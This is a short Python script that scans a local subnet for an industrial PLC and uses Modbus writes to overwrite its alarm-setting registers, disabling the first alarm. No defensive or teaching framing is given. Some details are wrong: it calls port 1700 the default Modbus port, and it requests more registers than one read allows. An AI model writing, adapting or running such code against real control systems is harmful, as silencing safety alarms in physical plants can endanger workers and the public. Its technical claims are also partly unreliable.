import socket
import struct

# Define the PLC's IP address and port
plc_ip = None
plc_port = 1700  # Default Modbus port

# Define the Modbus function codes
READ_COILS = 0x01
READ_INPUT_BITS = 0x02
READ_HOLDING_REGISTERS = 0x03
READ_INPUT_REGISTERS = 0x04
WRITE_SINGLE_COIL = 0x05
WRITE_SINGLE_REGISTER = 0x06

# Define the Modbus address of the alarm settings
alarm_settings_address = 0x0000  # Replace with the actual address of the alarm settings

# Define the length of the alarm settings
alarm_settings_length = 0x100  # Replace with the actual length of the alarm settings

def find_plc_ip():
    global plc_ip
    # Use the socket library to scan the network for the PLC's IP address
    for ip in range(1, 255):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect(("192.168.9." + str(ip), plc_port))
            sock.close()
            plc_ip = "192.168.9." + str(ip)
            break
        except socket.error:
            pass

def modify_alarm_settings():
    global plc_ip
    # Use the pymodbus library to access the PLC's memory regions
    from pymodbus.client.sync import ModbusTcpClient
    client = ModbusTcpClient(plc_ip, plc_port)
    # Read the alarm settings
    response = client.read_holding_registers(alarm_settings_address, alarm_settings_length)
    # Extract the alarm settings from the response
    alarm_settings = response.registers
    # Modify the alarm settings
    alarm_settings[0] = 0xFF00  # Disable the first alarm
    # Write the modified alarm settings back to the PLC
    client.write_registers(alarm_settings_address, alarm_settings)

def main():
    global plc_ip
    # Find the PLC's IP address
    find_plc_ip()
    if plc_ip is None:
        print("PLC not found on the network")
        return
    # Modify the alarm settings
    modify_alarm_settings()
    print("Alarm settings modified")

if __name__ == "__main__":
    main()